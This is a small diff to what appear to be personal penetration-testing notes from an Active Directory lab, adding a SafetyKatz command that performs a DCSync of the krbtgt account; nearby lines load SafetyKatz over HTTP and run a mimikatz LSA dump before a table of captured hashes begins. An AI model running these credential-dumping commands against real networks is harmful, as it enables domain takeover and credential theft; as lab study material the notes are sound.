@@ -347,6 +347,8 @@ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
 lsadump::lsa /patch
 ```
 ![[Pasted image 20231023111808.png]]
+C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
+
 `Administrator- DCORP-DC`
 
 | Type        | Hash                                                             |
